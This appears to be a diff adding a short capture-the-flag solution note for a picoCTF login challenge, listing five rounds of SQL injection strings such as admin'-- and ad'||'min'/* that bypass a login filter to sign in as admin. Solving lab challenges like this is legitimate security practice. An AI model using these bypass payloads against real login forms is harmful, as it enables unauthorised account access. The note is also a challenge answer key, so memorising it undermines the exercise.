@@ -1,0 +1,7 @@
+Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:29164/ http://jupiter.challenges.picoctf.org:29164/filter.php
+
+Round 1: admin'--
+Round 2: admin'/*
+Round 3: admin'/*
+Round 4: ad'||'min'/*
+Round 5: ad'||'min'/*
